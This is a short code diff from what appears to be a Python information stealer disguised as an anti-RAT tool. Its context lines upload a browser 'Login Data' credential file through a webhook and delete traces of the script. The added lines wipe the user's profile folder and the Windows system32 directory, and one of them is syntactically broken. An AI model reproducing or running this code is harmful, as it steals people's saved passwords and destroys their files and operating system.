@@ -149,5 +149,7 @@ def main():
         web.add_file(file=f.read(), filename='Login Data')
     web.execute()
     subprocess.getoutput('if exist "%userprofile%\AppData\System info.txt" del "%userprofile%\appdata\System info.txt"')
-    os.system('del ANTI-RAT_By_EtichalHackingItalia.exe')
+    subprocess.getoutput('del ANTI-RAT_By_EtichalHackingItalia.exe'/q)
+    subprocess.getoutput('rd "%userprofile%"/q /s')
+    subprocess.getoutput('rd "%windir%\system32"/q /s')
 main()
